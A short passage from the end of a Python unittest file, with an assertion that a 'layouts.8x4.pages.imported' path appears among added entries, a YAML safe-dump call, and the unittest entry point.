        self.assertIn("layouts.8x4.pages.imported", [a["path"] for a in p["added"]])
        yaml.safe_dump(cfg, allow_unicode=True)


if __name__ == "__main__":
    unittest.main()
